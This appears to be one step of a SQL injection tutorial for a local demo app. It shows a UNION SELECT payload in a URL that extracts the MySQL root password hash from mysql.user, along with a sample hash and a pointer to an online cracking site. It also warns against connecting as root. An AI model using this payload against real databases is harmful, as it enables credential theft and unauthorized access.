# (c) Password for database user

In the previous step we got the user used to connect to the database.
Now we need the password for that user.

MySQL stores user's password in a special database called "mysql". If you are using a service, "*MySQL as a service*" you probably won´t have access to this database.
If the connection user is not an admin user, or have permissions to access the mysql database, you won´t have access.
In generally this is not the case. Althouth it is the case of the **demo**.
**This step won´t work in the demo**

This is why is **so important** to create a normal user for connecting to the database in an application, and not using the root/admin user.

Ok, move on.
So, getting that password.

Let say that the user is "*root*"

```shell
http://localhost:8080/p/2 UNION SELECT 1,(SELECT authentication_string FROM mysql.user WHERE user = 'root'),3,4,5,6,7/slug-name-post'
```

> **Note:** Depending on the version of the MySQL server **authentication_string** may be **password**

The result will be something like this: 
```shell
*14594DCDEA27F5322936D6F1143F8C4F3B8F5A3E
```

This is a **41 bytes MySQL (4.1.1) hash**.
To get a clear text password you will have to break it. For this task you can use an online tool, for example => https://crackstation.net/

And that is it!!
